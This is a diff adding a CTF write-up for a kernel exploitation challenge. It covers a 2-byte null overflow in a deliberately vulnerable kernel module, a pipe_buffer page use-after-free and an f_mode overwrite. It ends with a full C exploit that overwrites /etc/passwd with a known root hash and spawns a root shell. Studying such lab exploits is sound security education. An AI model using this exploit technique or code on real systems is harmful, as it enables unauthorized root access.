@@ -521,3 +521,714 @@ run
 $ cat flag.txt
 LNC25{"solved":true,"response":"h0pe_y0u_enj0y3d_th3_ctf"}
 ```
+
+# Utility Pole Revengeance
+
+<Challenge 
+  title="Utility Pole Revengeance"
+  flag="LNC25{I_7HinK_1T5_t1m3_f07_J4Ck_t0_L37_3r_r1P!!}"
+  solves={0}>
+
+ROP LLC's new data center is managed by sysadmin Jack, who spends all of his
+time turning the pages of his books instead of securing the server. As one of
+our trusted operatives, surely you can root the server and show Jack that he
+should stop laughing at cat memes during company hours? Login credentials are
+`jack:jack`, and the flag is in `/dev/sdb`.
+
+Note: This challenge can be solved independently of Utility Pole: Revenge (Pt
+1), but solving part 1 would grant you access to the source code of the kernel
+module.
+</Challenge>
+
+This challenge was set by Kaligula, and it's a kernel pwn challenge as usual!
+I'm excited to try out her challenge and learn more new kernel stuff.
+
+## Analysis
+
+```c
+case CREATE_SECRET_MESSAGE: {
+    size = user_data.size; 
+    if (secret_message_created == 1) {
+        pr_info("Secret message has already been created!\n"); 
+        mutex_unlock(&mod_mutex);
+        return -1; 
+        break;
+       }
+    secret_msg = kzalloc(sizeof(struct secret_message), GFP_KERNEL_ACCOUNT);
+    message_buf = kzalloc(size * 2, GFP_KERNEL_ACCOUNT); 
+    secret_msg->size = size; 
+    secret_msg->message = (uint64_t)message_buf; 
+    pr_info("Secret message created!\n"); 
+    secret_message_created = 1;
+    mutex_unlock(&mod_mutex); 
+    return 0; 
+    break;
+}
+```
+
+The kernel module is quite simple. We can store a secret message of `size <=
+0x400{:c}` (it's a `uint16_t{:c}` array so actual size is up to 0x800). The
+message is allocated with `GFP_KERNEL_ACCOUNT{:c}`, so it will be placed in cg
+caches.
+
+```c
+case WRITE_SECRET_MESSAGE: {
+    if (secret_message_written == 1) {
+        pr_info("Secret message has already been
+                written!\n"); 
+        mutex_unlock(&mod_mutex); 
+        return -1; 
+        break;
+    }
+    if (secret_message_created == 0 || secret_msg == 0) {
+        pr_info("Secret message does not exist!\n"); 
+        mutex_unlock(&mod_mutex); 
+        return -1; 
+        break; 
+    }
+    size = secret_msg->size; 
+    ret = copy_from_user(buf, (void __user *)
+                               user_data.message, size);
+    for (int i = 0; i < size; i++) {
+        ((uint16_t*)secret_msg->message)[i] = buf[i];
+    }
+    ((uint16_t*)secret_msg->message)[size] = 0x0;
+    pr_info("Secret message written!\n");
+    secret_message_written = 1; 
+    mutex_unlock(&mod_mutex); 
+    return 0; 
+    break;
+}
+```
+
+When writing to the message, we have a 2-byte null-byte heap overflow which we
+can use to overwrite important objects that are allocated in cg caches. One such
+object that comes to mind is the `struct pipe_buffer{:c}` object.
+
+```c
+struct pipe_buffer {
+    struct page *page;
+    unsigned int offset, len;
+    const struct pipe_buf_operations *ops;
+    unsigned int flags;
+    unsigned long private;
+};
+```
+
+Allocated in `kmalloc-cg-1k`, it has a `struct page{:c}` pointer at the very
+start of the struct which can be overwritten with the 2 null bytes. This will
+change the pointer from something like `0xffffea00002a4fc0{:c}` to
+`0xffffea00002a0000{:c}`, which may end up overlapping with another `struct
+page{:c}` if we're lucky (or if we spray enough).
+
+## `struct page{:c}` and `struct pipe_buffer{:c}`
+
+We know that `pipe_buffer` is used to link 2 file descriptors
+together, such that we can write to one and read from the other. It does so
+through `struct page{:c}`, which tracks and manage references to a physical
+memory page. The underlying physical page is what we are writing to and reading
+from in the `pipe_buffer`. Initially, when allocated via creation of
+`pipe_buffer`, the `struct page{:c}` looks like this:
+
+```ansi
+[1m[32mgef> [0mx/8gx 0xffffea0000247540
+[34m0xffffea0000247540[39m:     0x0100000000000000      0x0000000000000000
+[34m0xffffea0000247550[39m:     0xdead000000000122      0x0000000000000000
+[34m0xffffea0000247560[39m:     0x0000000000000000      0x0000000000000000
+[34m0xffffea0000247570[39m:     0x00000001ffffffff      0xffff88800716ca82
+```
+
+The steps to manually convert a `struct page{:c}` into a physical address are
+very complicated, but basically this macro is used:
+
+```c
+/*
+ * Change "struct page" to physical address.
+ */
+#define page_to_phys(page)    ((dma_addr_t)page_to_pfn(page) << PAGE_SHIFT)
+```
+
+More info about how the kernel handles pages [can be found
+here](https://litux.nl/mirror/kerneldevelopment/0672327201/ch11lev1sec1.html).
+
+For our purposes, it isn't very important to resolve the physical address anyway
+because we can't access it via gdb unless it has a virtual address mapped to it,
+which isn't the case for `pipe_buffer`'s `struct page{:c}`, as it's
+mapped with `GFP_HIGHUSER{:c}` in `pipe_write(){:c}`, and high addresses don't
+have a permanent virtual mapping in kernel according to the documentation linked
+above.
+
+```c
+static ssize_t
+pipe_write(struct kiocb *iocb, struct iov_iter *from)
+{
+  // ...
+  if (!page) {
+    page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
+    if (unlikely(!page)) {
+      ret = ret ? : -ENOMEM;
+      break;
+    }
+    pipe->tmp_page = page;
+  }
+  // ...
+}
+```
+
+## `struct page{:c}` and the SLUB allocator
+
+`struct page{:c}` is also used by the SLUB allocator to maintain a slab cache,
+from which it allocates objects (or nodes). A slab, like `kmalloc-cg-1k`, refers
+to the higher-order allocation used to hold a group of same-sized objects, and a
+slab cache is a linked list of slabs that are all used for a certain size/type
+of object. Allocations from `kmalloc(){:c}` or `kmem_alloc_cache(){:c}` follow
+this pipeline when looking for a suitable slab in the slab cache:
+
+1. Check the active slab if it has free nodes (aka the lockless freelist) -
+  this is the fast path allocation.
+2. If the active slab is full, `__slab_alloc(){:c}` is called, where we check
+  if we have any partial slabs. If a partial slab is found, we make
+  this slab the new active slab, and allocate an object from here.
+3. If there are no partial slabs, then we need to create a new slab by
+  allocating a new page. This is done via `new_slab(){:c}` which eventually
+  calls `alloc_page(){:c}`, getting a page from the buddy allocator.
+
+(All this logic can be found starting from `__slab_alloc_node(){:c}`)
+
+---
+
+Now we know that a free page from `pipe_buffer` can be allocated for the SLUB
+allocator, the possibilities are endless! If we have a UAF on a `pipe_buffer`'s
+`struct page{:c}`, we can get the kernel to return the freed page for any object
+we wish, and then overwrite the objects allocated in our victim page using the
+`pipe_buffer`.
+
+## Exploit plan
+
+Our plan is to spray `struct file{:c}` objects onto the victim page, and
+overwrite `file->fmode_t{:c}`, which will then allow us to change the
+permissions for that file. This will allow us to write to something sensitive
+like `/etc/passwd`, and we can then set the root password to something we know.
+
+```c
+struct file {
+  atomic_long_t     f_count;
+  spinlock_t      f_lock;
+  fmode_t       f_mode;
+  const struct file_operations  *f_op;
+  struct address_space    *f_mapping;
+  void        *private_data;
+  struct inode      *f_inode;
+  unsigned int      f_flags;
+  unsigned int      f_iocb_flags;
+  const struct cred   *f_cred;
+  /* --- cacheline 1 boundary (64 bytes) --- */
+  struct path     f_path;
+  union {
+    /* regular files (with FMODE_ATOMIC_POS) and directories */
+    struct mutex    f_pos_lock;
+    /* pipes */
+    u64     f_pipe;
+  };
+  loff_t        f_pos;
+#ifdef CONFIG_SECURITY
+  void        *f_security;
+#endif
+  /* --- cacheline 2 boundary (128 bytes) --- */
+  struct fown_struct    *f_owner;
+  errseq_t      f_wb_err;
+  errseq_t      f_sb_err;
+#ifdef CONFIG_EPOLL
+  struct hlist_head   *f_ep;
+#endif
+  union {
+    struct callback_head  f_task_work;
+    struct llist_node f_llist;
+    struct file_ra_state  f_ra;
+    freeptr_t   f_freeptr;
+  };
+  /* --- cacheline 3 boundary (192 bytes) --- */
+} __randomize_layout
+  __attribute__((aligned(4)));  /* lest something weird decides that 2 is OK */
+```
+
+We know that `struct file{:c}` objects are allocated in the `filp` cache, based
+on the allocation path in `alloc_empty_file(){:c}`:
+
+```c
+// called from alloc_file
+struct file *alloc_empty_file(int flags, const struct cred *cred)
+{
+  // ...
+  f = kmem_cache_zalloc(filp_cachep, GFP_KERNEL);
+  // ...
+}
+
+void __init files_init(void)
+{
+    struct kmem_cache_args args = {
+        .use_freeptr_offset = true,
+        .freeptr_offset = offsetof(struct file, f_freeptr),
+      };
+
+    filp_cachep = kmem_cache_create("filp", sizeof(struct file), &args,
+                                            SLAB_HWCACHE_ALIGN | SLAB_PANIC |
+                                            SLAB_ACCOUNT |
+                                    SLAB_TYPESAFE_BY_RCU);
+    percpu_counter_init(&nr_files, 0, GFP_KERNEL);
+}
+```
+
+So what we want is to free the `pipe_buffer`'s `struct page{:c}`, and then
+allocate a filp `struct page{:c}` onto the victim page.
+
+## Pre-setup
+
+Before we commence with the exploit, let's do some setup to make our exploit
+success rate higher.
+
+```c
+CPU_ZERO(&cpu_set);
+CPU_SET(0, &cpu_set);
+sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+
+open_dev();
+pprintf("opened device on fd %d, starting exploit", fd);
+
+// pre-spray some files to fill up filp cache
+for (int i = 0; i < NUM_SPRAY_FILE; i++) {
+   open("/etc/passwd", O_RDONLY);
+}
+
+for (int i = 0; i < pipe_buf_spray; i++) {
+  buf[0] = i;
+  assert(pipe(pipe_buf_fds[i]) != -1);
+  write(pipe_buf_fds[i][1], buf, 0x30); 
+  if (i == pipe_buf_spray / 2) {
+    do_create_secret_message(0x400 / 2);
+  }
+}
+```
+
+First, we only want to use CPU0 so that our spray will be more consistent.
+
+Second, we can do an initial spray of files to drain the filp cache of slabs, so
+that opening files later will most likely trigger the allocation of a new page.
+
+Lastly, we spray `pipe_buffers` and insert the secret message inside the spray.
+In theory, the more `pipe_buffers` we spray, the higher chance we have for the
+exploit to succeed, since it's more likely for a `pipe_buffer`'s `struct
+page{:c}` to be found at 0xXXXXXXXX0000. Strangely, it seems like if we spray
+too many `pipe_buffers`, the secret message has a lower chance to be allocated
+right before a `pipe_buffer` object, which causes the entire OOB to fail in the
+first place.
+
+## UAF time
+
+```c
+user_req.size = 0x200;
+user_req.message = *payload;
+do_write_secret_message(&user_req);
+
+// at this point we should have overwritten one of the pages
+// lets find the victim pipe_buf
+size_t original = 0;
+size_t victim = 0;
+for (int i = 0; i < pipe_buf_spray; i++) {
+  size_t buf[2];
+  assert(read(pipe_buf_fds[i][0], buf, 0x10) != -1);
+  if (buf[0] != i) {
+    assert(0 <= buf[0] && buf[0] < pipe_buf_spray);
+    pprintf("found mismatch %p at idx %p", buf[0], i);
+    *original = buf[0];
+    *victim = i;
+  }
+}
+
+// now close the original pipe_buffer
+assert(close(pipe_buf_fds[original][0]) != -1);
+assert(close(pipe_buf_fds[original][1]) != -1);
+```
+
+Now, we target the `struct page{:c}` pointer with the oob write. After doing so,
+we need a way to identify which `pipe_buffer` has been overwritten, and which
+`pipe_buffer`'s page it is now pointing to. In the initial spray, we wrote the
+index of the `pipe_buffer` to the start of the page. If we compare this index
+against the actual index in our code, we can then identify both the victim and
+original `pipe_buffer`.
+
+Lastly, to free the `struct page{c:}`, we simply close both fds of the original
+`pipe_buffer`. Now, the freed page should look like this:
+
+```ansi
+[1m[32mgef> [0mx/8gx 0xffffea0000220000
+[34m0xffffea0000220000[39m:     0x0100000000000000      0xffffea00007c2748
+[34m0xffffea0000220010[39m:     0xffff88807dc31d60      0x0000000000000000
+[34m0xffffea0000220020[39m:     0x0000000000000000      0x0000000000000000
+[34m0xffffea0000220030[39m:     0x00000000ffffffff      0x0000000000000000
+```
+
+with fd and bk pointers to the freelist of pages. We still have reference to
+this `struct page{c:}` via the victim `pipe_buffer`, giving us our UAF.
+
+## Attacking `struct file{c:}`
+
+```c
+// now we have page-level uaf via victim
+// fill to the next file object
+write(pipe_buf_fds[victim][1], &buf[5], 0x);
+
+// spray a few more files, no need for a lot since we already drained the filp beforehand
+size_t final_file_spray = 0x200;
+int filefds[final_file_spray];
+for (int i = 0; i < final_file_spray; i++) {
+    filefds[i]= open("/etc/passwd", O_RDONLY);
+    assert(filefds[i] != -1);
+}
+
+uint32_t tmp[0x10];
+tmp[0] = 0x1;
+tmp[1] = 0x0;
+tmp[2] = 0x0;
+tmp[3] = 0x480e801f;
+pprintf("%d", write(pipe_buf_fds[victim][1], tmp, 0x10));
+pprintf("%s", strerror(errno));
+
+char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/bash\n";
+
+for (int i = 0; i < final_file_spray; i++) {
+  if (write(filefds[i], payload, sizeof(payload)) > 0) {
+    pprintf("write success at fptr %d! password is cafebabe", i);
+    break;
+  }
+}
+```
+
+Before we spray the `struct file{c:}` again, we want to make the cursor of the
+victim `pipe_buf` point to the start of a potential `struct file{c:}` - which
+means it should be 0xc0 from the start of the page, pointing to the 2nd node of
+the filp cache since the size of `struct file{c:}` is 0xc0.
+
+After this, we can spray a few more files to make sure the UAF page is allocated
+by buddy, and the slab's 2nd node is also allocated by SLUB. The page now looks
+something like this, if successful:
+
+```ansi
+[1m[32mgef> [0mx/8gx 0xffffea0000220000
+[34m0xffffea0000220000[39m:     0x0100000000000000      0xffff888003d41400
+[34m0xffffea0000220010[39m:     0xdead000000000122      0x0000000000000000
+[34m0xffffea0000220020[39m:     0x0000000000000000      0x0000000000150015
+[34m0xffffea0000220030[39m:     0x00000001f5000000      0xffff88801f0873c1
+```
+
+The pointer at +0x8, if we view its contents, contains some string values that
+refer to "filp", which is how we know the page has been successfully allocated
+for the filp slab cache.
+
+```ansi
+[36m0xffff888003d41400[39m|+0x0000|+000: 0x00000000000322d0
+[36m0xffff888003d41408[39m|+0x0008|+001: 0x0000000000022310
+[36m0xffff888003d41410[39m|+0x0010|+002: 0x0000000000000005
+[36m0xffff888003d41418[39m|+0x0018|+003: 0x000000b8000000c0
+[36m0xffff888003d41420[39m|+0x0020|+004: 0x0000070155555556
+[36m0xffff888003d41428[39m|+0x0028|+005: 0x0000007800000098
+[36m0xffff888003d41430[39m|+0x0030|+006: 0x000000150000000c
+[36m0xffff888003d41438[39m|+0x0038|+007: 0x0004000000000015
+[36m0xffff888003d41440[39m|+0x0040|+008: 0x0000000000000001
+[36m0xffff888003d41448[39m|+0x0048|+009: 0x0000000000000000
+[36m0xffff888003d41450[39m|+0x0050|+010: 0x00000040000000b8
+[36m0xffff888003d41458[39m|+0x0058|+011: 0x0000000000000000
+[36m0xffff888003d41460[39m|+0x0060|+012: 0xffffffff828e8e9e <trunc_msg+0x1851f>  ->  0x5f736600706c6966 ([33m'filp'[39m?)
+[36m0xffff888003d41468[39m|+0x0068|+013: 0xffff888003d41c68  ->  0xffff888003d41f68  ->  0xffff888003d3f768  ->  ...
+[36m0xffff888003d41470[39m|+0x0070|+014: 0xffff888003d41068  ->  0xffff888003d41468  ->  0xffff888003d41c68  ->  ...
+[36m0xffff888003d41478[39m|+0x0078|+015: 0xffffffff828e8e9e <trunc_msg+0x1851f>  ->  0x5f736600706c6966 ([33m'filp'[39m?)
+[36m0xffff888003d41480[39m|+0x0080|+016: 0xffff888003d41c80  ->  0xffff888003d41f80  ->  0xffff888003d3f780  ->  ...
+[36m0xffff888003d41488[39m|+0x0088|+017: 0xffff888003d41080  ->  0xffff888003d41480  ->  0xffff888003d41c80  ->  ...
+[36m0xffff888003d41490[39m|+0x0090|+018: 0xffff888004d30f18  ->  0xffffffff828e6961 <trunc_msg+0x15fe2>  ->  0x5333010062616c73 ([33m'slab'[39m?)
+[36m0xffff888003d41498[39m|+0x0098|+019: 0xffff888004d30f00  ->  0xffff888003edac80  ->  0xffff888003edaf80  ->  ...
+[36m0xffff888003d414a0[39m|+0x00a0|+020: 0xffffffff8241d4a8 <slab_ktype>  ->  0xffffffff812ba730 <kmem_cache_release>  ->  0x88c78348fa1e0ff3
+[36m0xffff888003d414a8[39m|+0x00a8|+021: 0xffff888004deda18  ->  0x000000000000001f <__UNIQUE_ID_description333+0x13>
+[36m0xffff888003d414b0[39m|+0x00b0|+022: 0x0000000300000001
+[36m0xffff888003d414b8[39m|+0x00b8|+023: 0xf20034324ab65020
+[36m0xffff888003d414c0[39m|+0x00c0|+024: 0x00000000000003e8
+[36m0xffff888003d414c8[39m|+0x00c8|+025: 0xffff888003c584e0  ->  0x00000d80000006c0
+[36m0xffff888003d414d0[39m|+0x00d0|+026: 0x0000000000000000
+[36m0xffff888003d414d8[39m|+0x00d8|+027: 0xffff888003d39d40  ->  0x0000000000000000
+[36m0xffff888003d414e0[39m|+0x00e0|+028: 0x0000000000000000
+[36m0xffff888003d414e8[39m|+0x00e8|+029: 0x0000000000000000
+[36m0xffff888003d414f0[39m|+0x00f0|+030: 0x0000000000000000
+[36m0xffff888003d414f8[39m|+0x00f8|+031: 0x0000000000000000
+```
+
+Once this is done, we attempt to write to a `file` object by writing to the
+victim `pipe_buf`. Before the write, the `file` looks like this:
+
+```ansi
+[1m[32mgef> [0mx/24gx 0xffff88801f0b60c0
+[34m0xffff88801f0b60c0[39m:     0x0000000000000001      0x084a801d00000000
+[34m0xffff88801f0b60d0[39m:     0xffffffff8242a4c0      0xffff888004302b18
+[34m0xffff88801f0b60e0[39m:     0x0000000000000000      0xffff8880043029a8
+[34m0xffff88801f0b60f0[39m:     0x0000000000008000      0xffff888005597b40
+[34m0xffff88801f0b6100[39m:     0xffff888003fa3820      0xffff8880040593c0
+[34m0xffff88801f0b6110[39m:     0x0000000000000000      0x0000000000000000
+[34m0xffff88801f0b6120[39m:     0xffff88801f0b6120      0xffff88801f0b6120
+[34m0xffff88801f0b6130[39m:     0x0000000000000000      0xffff88801f0aee90
+[34m0xffff88801f0b6140[39m:     0x0000000000000000      0x0000000000000000
+[34m0xffff88801f0b6150[39m:     0x0000000000000000      0x0000000000000000
+[34m0xffff88801f0b6160[39m:     0x0000000000000000      0x0000000000000020
+[34m0xffff88801f0b6170[39m:     0xffffffffffffffff      0x0000000000000000
+```
+
+The value of `file->f_mode{:c}` is `0x084a801d{:c}`. Both `FMODE_WRITE` (1 \<\< 1)
+and `FMODE_CAN_WRITE` (1 \<\< 18) are set to 0, which will fail the following
+checks in `vfs_write(){:c}`:
+
+```c
+ssize_t vfs_write(struct file *file, const char __user *buf, size_t count,
+                  loff_t *pos)
+{
+    ssize_t ret;
+
+    if (!(file->f_mode & FMODE_WRITE))
+        return -EBADF;
+    if (!(file->f_mode & FMODE_CAN_WRITE))
+        return -EINVAL;
+    // ..
+}
+```
+
+Our write primitive should set the value to `0x084a80d | FMODE_WRITE |
+FMODE_CAN_WRITE{:c}`, which is `0x84e801f{:c}`.
+
+To see if this succeeds, we simply try to write to every single file that we've
+opened, and if `write(){c:}` doesn't return -1, we would have successfully
+written to the file. If so, `/etc/passwd` will already be overwritten, and we
+can exit the program and login as root!
+
+## Exploit
+
+Full exploit:
+
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <pthread.h>
+#include <errno.h>
+#include <assert.h>
+#include <stdarg.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <time.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/resource.h>
+
+int fd = 0;
+ 
+void pprintf(char *str, ...) {
+  printf("[*] ");
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+  printf("\n");
+}
+ 
+void pprintfc(char *str, ...) {
+  printf("\33[2K\r[*] ");
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+}
+ 
+ 
+void ppause(char *str, ...) {
+  printf("[-] ");
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+  printf("\n");
+  getchar();
+}
+ 
+void open_dev() {
+  fd = open("/dev/jacks_filedump", O_RDWR);
+}
+ 
+void get_shell() {
+  system("/bin/sh");
+}
+
+#define CREATE_SECRET_MESSAGE 0xc010ca00
+#define WRITE_SECRET_MESSAGE 0xc010ca01
+
+struct req {
+    uint64_t size;
+    uint64_t message;
+};
+
+int do_create_secret_message(size_t size) {
+  struct req user_req;
+  user_req.size = size;
+  return ioctl(fd, CREATE_SECRET_MESSAGE, &user_req);
+}
+
+#define NUM_SPRAY_FILE 0x400
+
+#define pipe_buf_spray 0x40
+int pipe_buf_fds[pipe_buf_spray][2];
+
+size_t buf[24];
+
+void do_pipe_buf_spray() {
+  // size of file is 0xc0, we write until the next file
+  buf[1] = 0xcafebabe;
+  buf[2] = 0xdeadbeef;
+  buf[3] = 0xdeadbabe;
+  buf[4] = 0xcafebeef;
+  buf[5] = 0xcafebabe;
+  buf[6] = 0xdeadbeef;
+  buf[7] = 0xdeadbabe;
+  buf[8] = 0xcafebeef;
+  buf[9] = 0xcafebeef;
+  buf[10] = 0xcafebeef;
+  buf[11] = 0xcafebeef;
+  buf[12] = 0xcafebeef;
+  buf[13] = 0xcafebeef;
+  buf[14] = 0xcafebeef;
+  buf[15] = 0xcafebeef;
+  buf[16] = 0xcafebeef;
+  buf[17] = 0xcafebeef;
+  buf[18] = 0xcafebeef;
+  buf[19] = 0xcafebeef;
+  buf[20] = 0xcafebeef;
+  buf[21] = 0xcafebeef;
+  buf[22] = 0xcafebeef;
+  buf[23] = 0xcafebeef;
+
+  for (int i = 0; i < pipe_buf_spray / 2; i++) {
+    buf[0] = i;
+    assert(pipe(pipe_buf_fds[i]) != -1);
+    // need to write 0x90 more to victim only
+    assert(write(pipe_buf_fds[i][1], &buf[0], 0x8) != -1);
+    assert(write(pipe_buf_fds[i][1], &buf[1], 0x28) != -1);
+  }
+
+  do_create_secret_message(0x400 / 2);
+
+  for (int i = pipe_buf_spray / 2; i < pipe_buf_spray; i++) {
+    buf[0] = i;
+    assert(pipe(pipe_buf_fds[i]) != -1);
+    // need to write 0x90 more to victim only
+    assert(write(pipe_buf_fds[i][1], &buf[0], 0x8) != -1);
+    assert(write(pipe_buf_fds[i][1], &buf[1], 0x28) != -1); 
+  }
+}
+
+int do_oob() {
+  struct req user_req;
+
+  uint16_t payload[0x200] = { 1 };
+  memset(payload, 0x1, 0x200*2);
+
+  user_req.size = 0x200;
+  user_req.message = *payload;
+
+  assert(ioctl(fd, WRITE_SECRET_MESSAGE, &user_req) != -1);
+}
+
+void find_victim_pipe_buf(size_t* idx1, size_t* idx2) {
+  for (int i = 0; i < pipe_buf_spray; i++) {
+    if (i == 3 * pipe_buf_spray / 4) continue;
+    size_t buf[2];
+    assert(read(pipe_buf_fds[i][0], buf, 0x10) != -1);
+    if (buf[0] != i) {
+      pprintf("found mismatch %p at idx %p", buf[0], i);
+      assert(0 <= buf[0] && buf[0] < pipe_buf_spray);
+      *idx1 = buf[0];
+      *idx2 = i;
+      break;
+    }
+  }
+  assert(*idx1 != *idx2);
+}
+
+void free_pipe_buf(size_t original) {
+  assert(close(pipe_buf_fds[original][0]) != -1);
+  assert(close(pipe_buf_fds[original][1]) != -1);
+}
+
+cpu_set_t cpu_set;
+
+int main() {
+  CPU_ZERO(&cpu_set);
+  CPU_SET(0, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+ 
+  open_dev();
+  pprintf("opened device on fd %d, starting exploit", fd);
+
+  // pre-spray some files to fill up filp cache
+  for (int i = 0; i < NUM_SPRAY_FILE; i++) {
+      open("/etc/passwd", O_RDONLY);
+  }
+
+  // spray pipe bufs and insert attacker object somewhere in middle
+  do_pipe_buf_spray();
+  pprintf("do_pipe_buf_spray()");
+
+  do_oob();
+  pprintf("do_oob()");
+
+  // at this point we should have overwritten one of the pages
+  // lets find the victim pipe_buf
+  size_t original = 0;
+  size_t victim = 0;
+  find_victim_pipe_buf(&original, &victim);
+  pprintf("find_victim_pipe_buf()");
+
+  free_pipe_buf(original);
+  pprintf("free_victim_pipe_bufs()");
+
+  // now we have page-level uaf via victim
+  // fill to the next file object
+  write(pipe_buf_fds[victim][1], &buf[5], 0x90);
+
+  // spray a few more files, no need for a lot since we already drained the filp beforehand
+  size_t final_file_spray = 0x200;
+  int filefds[final_file_spray];
+  for (int i = 0; i < final_file_spray; i++) {
+      filefds[i]= open("/etc/passwd", O_RDONLY);
+      assert(filefds[i] != -1);
+  }
+  pprintf("sprayed struct file of /etc/passwd");
+
+  uint32_t tmp[0x10];
+  tmp[0] = 0x1;
+  tmp[1] = 0x0;
+  tmp[2] = 0x0;
+  tmp[3] = 0x080e801f;
+  pprintf("%d", write(pipe_buf_fds[victim][1], tmp, 0x10));
+  pprintf("%s", strerror(errno));
+  pprintf("edit pwd file->f_mode");
+
+  char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/bash\n";
+
+  for (int i = 0; i < final_file_spray; i++) {
+    if (write(filefds[i], payload, sizeof(payload)) > 0) {
+      pprintf("write success at fptr %d! password is cafebabe", i);
+      for (int i = 0; i < final_file_spray; i++) {
+        close(filefds[i]);
+      }
+      // might fail because too many files open
+      system("su -c '/bin/bash'");
+      exit(0);
+      break;
+    }
+  }
+  pprintf("failed");
+  exit(-1);
+}
+```
